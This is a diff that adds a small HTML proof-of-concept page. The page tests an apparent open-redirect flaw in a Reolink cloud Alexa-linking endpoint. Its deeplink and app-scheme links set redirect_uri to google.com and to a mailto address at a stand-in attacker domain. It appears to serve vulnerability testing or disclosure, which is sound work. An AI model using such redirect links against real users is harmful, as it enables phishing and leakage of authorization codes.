@@ -1,0 +1,25 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Reolink Redirect PoC</title>
+</head>
+<body>
+    <h1>Reolink Redirect Test</h1>
+    
+    <h2>Deeplink</h2>
+    <a href="https://cloud.reolink.com/ulink/smarthome/alexa/?code=test&state=abc&scope=read&redirect_uri=https://google.com" target="_blank">
+        Open Deeplink → google.com
+    </a>
+
+    <h2>App Link</h2>
+    <a href="reolinksmarthome://cloud.reolink.com/ulink/smarthome/alexa/?code=test&state=abc&scope=read&redirect_uri=https://google.com">
+        Open App Link → google.com
+    </a>
+
+    <h2>App Link (mailto)</h2>
+    <a href="reolinksmarthome://cloud.reolink.com/ulink/smarthome/alexa/?code=test&state=abc&scope=read&redirect_uri=mailto%3Ahacker%4040evil.com%3Fsubject%3DHello%26body%3DThis%20is%20a%20test">
+        Open App Link → mailto
+    </a>
+</body>
+</html>
